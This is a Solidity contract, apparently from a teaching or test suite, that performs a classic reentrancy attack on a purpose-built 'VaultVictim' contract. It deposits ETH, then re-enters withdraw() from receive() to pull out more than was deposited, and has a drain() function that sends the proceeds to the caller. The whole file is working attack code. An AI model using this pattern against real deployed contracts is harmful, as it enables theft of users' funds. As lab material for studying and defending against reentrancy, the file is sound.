// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VaultVictim.sol";

/**
 * Attacker1_Basic
 * Classic single-function reentrancy attack.
 * Calls withdraw() on VaultVictim, then re-enters withdraw()
 * from receive() before the balance is zeroed.
 */
contract Attacker1_Basic {
    VaultVictim public target;
    uint256 public attackCount;
    uint256 public maxDepth;

    constructor(address _target) {
        target = VaultVictim(payable(_target));
    }

    function setMaxDepth(uint256 _depth) external {
        maxDepth = _depth;
    }

    function attack() external payable {
        require(msg.value > 0, "need ETH");
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        attackCount++;
        if (attackCount < maxDepth && address(target).balance >= 1 ether) {
            target.withdraw();
        }
    }

    function drain() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
